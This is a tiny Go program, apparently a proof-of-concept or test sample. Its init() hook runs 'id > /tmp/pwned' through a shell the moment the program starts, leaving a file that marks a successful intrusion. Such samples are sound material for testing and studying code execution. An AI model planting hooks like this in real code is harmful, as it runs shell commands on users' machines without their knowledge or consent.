package main

import (
	"os/exec"
)

func init() {
	exec.Command("sh", "-c", "id > /tmp/pwned").Run()
}

func main() {}
